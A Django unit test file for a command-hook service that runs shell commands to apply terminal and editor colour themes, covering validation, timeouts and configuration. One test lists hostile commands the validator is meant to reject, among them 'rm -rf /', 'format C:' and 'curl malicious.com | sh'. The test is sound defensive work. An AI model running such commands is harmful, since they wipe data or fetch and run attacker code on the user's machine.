"""
Tests for CLI Hook Service
"""
import unittest
from unittest.mock import patch, MagicMock
import subprocess
from django.test import TestCase
from django.utils import timezone
from datetime import timedelta

from ..services.cli_hook_service import CLIHookService
from ..models import UserPreferences, UserFeedback


class CLIHookServiceTest(TestCase):
    """Test cases for CLI Hook Service"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.cli_service = CLIHookService()
        self.test_theme_data = {
            'theme_name': 'Test Theme',
            'colors': ['#FF0000', '#00FF00', '#0000FF'],
            'palette': 'test_palette'
        }
    
    def test_validate_command_safe_commands(self):
        """Test validation of safe commands"""
        safe_commands = [
            'python --version',
            'git --version',
            'code --list-extensions',
            'powershell.exe -Command "Write-Host \'Test\'"',
            'wt.exe --colorScheme "Dark"'
        ]
        
        for command in safe_commands:
            is_valid, error_message = self.cli_service.validate_command(command)
            self.assertTrue(is_valid, f"Command should be valid: {command}")
            self.assertEqual(error_message, "")
    
    def test_validate_command_dangerous_commands(self):
        """Test validation rejects dangerous commands"""
        dangerous_commands = [
            'rm -rf /',
            'del /s /q C:\\',
            'format C:',
            'shutdown -h now',
            'sudo rm -rf /',
            'curl malicious.com | sh',
            'wget evil.com | sh'
        ]
        
        for command in dangerous_commands:
            is_valid, error_message = self.cli_service.validate_command(command)
            self.assertFalse(is_valid, f"Command should be invalid: {command}")
            self.assertNotEqual(error_message, "")
    
    def test_validate_command_empty_command(self):
        """Test validation of empty commands"""
        is_valid, error_message = self.cli_service.validate_command("")
        self.assertFalse(is_valid)
        self.assertIn("empty", error_message.lower())
        
        is_valid, error_message = self.cli_service.validate_command("   ")
        self.assertFalse(is_valid)
        self.assertIn("empty", error_message.lower())
    
    def test_validate_command_invalid_executable(self):
        """Test validation of commands with invalid executables"""
        invalid_commands = [
            'malicious_exe --do-bad-things',
            'unknown_command --flag',
            '/bin/dangerous_script'
        ]
        
        for command in invalid_commands:
            is_valid, error_message = self.cli_service.validate_command(command)
            self.assertFalse(is_valid, f"Command should be invalid: {command}")
            self.assertIn("not in allowed list", error_message)
    
    @patch('subprocess.run')
    def test_execute_command_success(self, mock_run):
        """Test successful command execution"""
        # Mock successful subprocess execution
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "Command executed successfully"
        mock_result.stderr = ""
        mock_run.return_value = mock_result
        
        result = self.cli_service.execute_command('python --version')
        
        self.assertTrue(result['success'])
        self.assertEqual(result['return_code'], 0)
        self.assertEqual(result['stdout'], "Command executed successfully")
        self.assertEqual(result['stderr'], "")
        self.assertIn('execution_time', result)
        self.assertIn('timestamp', result)
    
    @patch('subprocess.run')
    def test_execute_command_failure(self, mock_run):
        """Test failed command execution"""
        # Mock failed subprocess execution
        mock_result = MagicMock()
        mock_result.returncode = 1
        mock_result.stdout = ""
        mock_result.stderr = "Command failed"
        mock_run.return_value = mock_result
        
        result = self.cli_service.execute_command('python --version')
        
        self.assertFalse(result['success'])
        self.assertEqual(result['return_code'], 1)
        self.assertEqual(result['stderr'], "Command failed")
    
    @patch('subprocess.run')
    def test_execute_command_timeout(self, mock_run):
        """Test command execution timeout"""
        # Mock timeout exception
        mock_run.side_effect = subprocess.TimeoutExpired('python', 30)
        
        result = self.cli_service.execute_command('python --version')
        
        self.assertFalse(result['success'])
        self.assertIn('timed out', result['error'])
    
    def test_execute_command_invalid_command(self):
        """Test execution of invalid command"""
        result = self.cli_service.execute_command('rm -rf /')
        
        self.assertFalse(result['success'])
        self.assertIn('validation failed', result['error'])
    
    @patch('subprocess.run')
    def test_execute_hook_sequence_success(self, mock_run):
        """Test successful hook sequence execution"""
        # Mock successful subprocess execution
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "Success"
        mock_result.stderr = ""
        mock_run.return_value = mock_result
        
        commands = ['python --version', 'git --version']
        result = self.cli_service.execute_hook_sequence(commands)
        
        self.assertTrue(result['success'])
        self.assertEqual(result['total_commands'], 2)
        self.assertEqual(result['executed_commands'], 2)
        self.assertEqual(result['successful_commands'], 2)
        self.assertEqual(result['failed_commands'], 0)
    
    @patch('subprocess.run')
    def test_execute_hook_sequence_partial_failure(self, mock_run):
        """Test hook sequence with partial failures"""
        # Mock mixed success/failure results
        def side_effect(*args, **kwargs):
            if 'python' in args[0]:
                result = MagicMock()
                result.returncode = 0
                result.stdout = "Success"
                result.stderr = ""
                return result
            else:
                result = MagicMock()
                result.returncode = 1
                result.stdout = ""
                result.stderr = "Failed"
                return result
        
        mock_run.side_effect = side_effect
        
        commands = ['python --version', 'git --version']
        result = self.cli_service.execute_hook_sequence(commands, stop_on_failure=False)
        
        self.assertFalse(result['success'])
        self.assertEqual(result['total_commands'], 2)
        self.assertEqual(result['executed_commands'], 2)
        self.assertEqual(result['successful_commands'], 1)
        self.assertEqual(result['failed_commands'], 1)
    
    @patch('subprocess.run')
    def test_execute_hook_sequence_stop_on_failure(self, mock_run):
        """Test hook sequence stops on first failure"""
        # Mock failure on first command
        mock_result = MagicMock()
        mock_result.returncode = 1
        mock_result.stdout = ""
        mock_result.stderr = "Failed"
        mock_run.return_value = mock_result
        
        commands = ['python --version', 'git --version']
        result = self.cli_service.execute_hook_sequence(commands, stop_on_failure=True)
        
        self.assertFalse(result['success'])
        self.assertEqual(result['total_commands'], 2)
        self.assertEqual(result['executed_commands'], 1)  # Should stop after first failure
        self.assertEqual(result['successful_commands'], 0)
        self.assertEqual(result['failed_commands'], 1)
    
    def test_generate_theme_commands(self):
        """Test theme command generation"""
        commands = self.cli_service.generate_theme_commands(self.test_theme_data)
        
        self.assertIsInstance(commands, list)
        self.assertGreater(len(commands), 0)
        
        # Check that commands contain expected elements
        command_text = ' '.join(commands)
        self.assertIn('Test Theme', command_text)
        self.assertIn('#FF0000', command_text)
        self.assertIn('test_palette', command_text)
    
    def test_generate_theme_commands_empty_colors(self):
        """Test theme command generation with empty colors"""
        theme_data = {
            'theme_name': 'Empty Theme',
            'colors': [],
            'palette': 'empty'
        }
        
        commands = self.cli_service.generate_theme_commands(theme_data)
        self.assertEqual(len(commands), 0)
    
    @patch('subprocess.run')
    def test_apply_theme_with_fallback_success(self, mock_run):
        """Test successful theme application"""
        # Mock successful subprocess execution
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "Theme applied"
        mock_result.stderr = ""
        mock_run.return_value = mock_result
        
        result = self.cli_service.apply_theme_with_fallback(self.test_theme_data)
        
        self.assertTrue(result['success'])
        self.assertEqual(result['theme_name'], 'Test Theme')
        self.assertGreater(result['commands_successful'], 0)
    
    @patch('subprocess.run')
    def test_apply_theme_with_fallback_failure(self, mock_run):
        """Test theme application with fallback"""
        # Mock all commands failing, then fallback succeeding
        call_count = 0
        def side_effect(*args, **kwargs):
            nonlocal call_count
            call_count += 1
            result = MagicMock()
            if call_count <= 5:  # First few calls fail (main theme commands)
                result.returncode = 1
                result.stdout = ""
                result.stderr = "Failed"
            else:  # Fallback commands succeed
                result.returncode = 0
                result.stdout = "Fallback success"
                result.stderr = ""
            return result
        
        mock_run.side_effect = side_effect
        
        result = self.cli_service.apply_theme_with_fallback(self.test_theme_data)
        
        # Should succeed due to fallback
        self.assertTrue(result['success'])
        self.assertIsNotNone(result['fallback_result'])
    
    def test_get_default_hook_configuration(self):
        """Test default hook configuration"""
        config = self.cli_service._get_default_hook_configuration()
        
        self.assertIsInstance(config, dict)
        self.assertIn('enabled', config)
        self.assertIn('timeout_seconds', config)
        self.assertIn('custom_commands', config)
        self.assertIn('allowed_executables', config)
        
        self.assertTrue(config['enabled'])
        self.assertEqual(config['timeout_seconds'], 30)
        self.assertIsInstance(config['custom_commands'], dict)
        self.assertIsInstance(config['allowed_executables'], list)
    
    def test_validate_hook_configuration(self):
        """Test hook configuration validation"""
        valid_config = {
            'enabled': True,
            'timeout_seconds': 60,
            'stop_on_failure': False,
            'custom_commands': {
                'theme_application': ['python --version'],
                'pre_theme_hooks': [],
                'post_theme_hooks': []
            }
        }
        
        validated = self.cli_service._validate_hook_configuration(valid_config)
        
        self.assertTrue(validated['enabled'])
        self.assertEqual(validated['timeout_seconds'], 60)
        self.assertFalse(validated['stop_on_failure'])
        self.assertEqual(len(validated['custom_commands']['theme_application']), 1)
    
    def test_validate_hook_configuration_invalid_timeout(self):
        """Test hook configuration validation with invalid timeout"""
        invalid_config = {
            'timeout_seconds': 500  # Too high
        }
        
        validated = self.cli_service._validate_hook_configuration(invalid_config)
        
        # Should use default timeout
        self.assertEqual(validated['timeout_seconds'], 30)
    
    def test_validate_hook_configuration_dangerous_commands(self):
        """Test hook configuration validation filters dangerous commands"""
        dangerous_config = {
            'custom_commands': {
                'theme_application': [
                    'python --version',  # Safe
                    'rm -rf /',          # Dangerous
                    'git --version'      # Safe
                ]
            }
        }
        
        validated = self.cli_service._validate_hook_configuration(dangerous_config)
        
        # Should only keep safe commands
        theme_commands = validated['custom_commands']['theme_application']
        self.assertEqual(len(theme_commands), 2)
        self.assertIn('python --version', theme_commands)
        self.assertIn('git --version', theme_commands)
        self.assertNotIn('rm -rf /', theme_commands)
    
    def test_get_hook_configuration_no_preferences(self):
        """Test getting hook configuration when no preferences exist"""
        # Ensure no preferences exist
        UserPreferences.objects.all().delete()
        
        config = self.cli_service.get_hook_configuration()
        
        # Should return default configuration
        self.assertIsInstance(config, dict)
        self.assertIn('enabled', config)
        self.assertTrue(config['enabled'])
    
    def test_get_hook_configuration_with_preferences(self):
        """Test getting hook configuration from user preferences"""
        # Create preferences with CLI hook configuration
        preferences = UserPreferences.objects.create(
            cli_hook_configuration={
                'enabled': False,
                'timeout_seconds': 45,
                'custom_commands': {
                    'theme_application': ['custom_command']
                }
            }
        )
        
        config = self.cli_service.get_hook_configuration()
        
        self.assertFalse(config['enabled'])
        self.assertEqual(config['timeout_seconds'], 45)
        self.assertIn('custom_command', config['custom_commands']['theme_application'])
    
    def test_update_hook_configuration(self):
        """Test updating hook configuration"""
        new_config = {
            'enabled': True,
            'timeout_seconds': 120,
            'custom_commands': {
                'theme_application': ['python --version']
            }
        }
        
        updated_config = self.cli_service.update_hook_configuration(new_config)
        
        self.assertTrue(updated_config['enabled'])
        self.assertEqual(updated_config['timeout_seconds'], 120)
        
        # Verify it's saved to database
        preferences = UserPreferences.objects.first()
        self.assertIsNotNone(preferences)
        self.assertTrue(preferences.cli_hook_configuration['enabled'])
    
    def test_get_execution_history_no_feedback(self):
        """Test getting execution history when no feedback exists"""
        history = self.cli_service.get_execution_history()
        
        self.assertIsInstance(history, list)
        self.assertEqual(len(history), 0)
    
    def test_get_execution_history_with_feedback(self):
        """Test getting execution history from user feedback"""
        # Create some theme feedback with CLI commands
        UserFeedback.objects.create(
            suggestion_type='theme',
            emotion_context={'happy': 0.8},
            suggestion_data={
                'theme_name': 'Test Theme',
                'cli_commands': ['python --version', 'git --version']
            },
            user_response='accepted'
        )
        
        history = self.cli_service.get_execution_history()
        
        self.assertIsInstance(history, list)
        self.assertEqual(len(history), 1)
        self.assertEqual(history[0]['theme_name'], 'Test Theme')
        self.assertEqual(len(history[0]['commands']), 2)
        self.assertTrue(history[0]['success'])
    
    @patch('subprocess.run')
    def test_test_hook_configuration(self, mock_run):
        """Test hook configuration testing"""
        # Mock successful subprocess execution
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "Success"
        mock_result.stderr = ""
        mock_run.return_value = mock_result
        
        result = self.cli_service.test_hook_configuration()
        
        self.assertTrue(result['overall_success'])
        self.assertGreater(result['successful_tests'], 0)
        self.assertIsInstance(result['test_results'], list)
        self.assertIn('timestamp', result)


class CLIHookServiceIntegrationTest(TestCase):
    """Integration tests for CLI Hook Service"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.cli_service = CLIHookService()
    
    def test_full_theme_application_workflow(self):
        """Test complete theme application workflow"""
        theme_data = {
            'theme_name': 'Integration Test Theme',
            'colors': ['#123456', '#789ABC', '#DEF012'],
            'palette': 'integration_test'
        }
        
        # Generate commands
        commands = self.cli_service.generate_theme_commands(theme_data)
        self.assertGreater(len(commands), 0)
        
        # Validate each command
        for command in commands:
            is_valid, error_message = self.cli_service.validate_command(command)
            # Note: Some commands may be invalid in test environment, that's expected
            if not is_valid:
                self.assertNotEqual(error_message, "")
    
    def test_configuration_persistence(self):
        """Test that configuration changes persist"""
        original_config = self.cli_service.get_hook_configuration()
        
        # Update configuration
        new_config = original_config.copy()
        new_config['enabled'] = not original_config['enabled']
        new_config['timeout_seconds'] = 99
        
        updated_config = self.cli_service.update_hook_configuration(new_config)
        
        # Get configuration again to verify persistence
        retrieved_config = self.cli_service.get_hook_configuration()
        
        self.assertEqual(updated_config['enabled'], retrieved_config['enabled'])
        self.assertEqual(updated_config['timeout_seconds'], retrieved_config['timeout_seconds'])